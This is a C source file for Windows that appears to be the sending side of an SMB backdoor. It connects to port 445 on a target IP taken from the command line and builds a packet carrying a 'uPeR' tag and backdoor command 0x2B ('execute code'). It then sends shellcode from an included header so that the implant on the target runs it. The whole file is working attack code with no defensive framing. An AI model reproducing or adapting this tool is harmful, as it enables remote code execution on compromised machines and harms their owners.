#include <stdio.h>
#include <stdint.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <TlHelp32.h>
#pragma comment(lib, "ws2_32.lib")


#include "packet.h"
#include "shellcode.h"


int main(int argc, char* argv[]) {
	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	WSAStartup(wVersionRequested, &wsaData);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	
	InetPtonA(AF_INET, argv[1], &client.sin_addr);
	connect(sock, (sockaddr*)&client, sizeof(client));

	REPULSAR_EXECUTE exec;

	exec.NetBios = 0x0;
	exec.SmbHeader[0] = 'u';
	exec.SmbHeader[1] = 'P';
	exec.SmbHeader[2] = 'e';
	exec.SmbHeader[3] = 'R';
	exec.BackdoorCommand = 0x2B;	//0x2b execute code

	exec.NetBiosLength = htons((sizeof(REPULSAR_EXECUTE) - 0x4)); //4Bytes netbios struct
	

	exec.ShellcodeLength = sizeof(USERMODE_SHELLCODE) - 0x1;

	memset(exec.shellcode, 0, sizeof(USERMODE_SHELLCODE)-0x1); //1Byte 0-terminated array
	memcpy(exec.shellcode, USERMODE_SHELLCODE, sizeof(USERMODE_SHELLCODE)-0x1);


	printf("SHELLCODE SIZE 0x%x\n", exec.ShellcodeLength);
	printf("Sending SMB packet wit tag 0x%x and command 0x%X...\n", *(PULONG)exec.SmbHeader, exec.BackdoorCommand);
	printf("Your shellcode will be executed!\n");
	send(sock, (const char*)&exec, sizeof(REPULSAR_EXECUTE), 0);

	printf("--------Done!\n");
	return 0;
}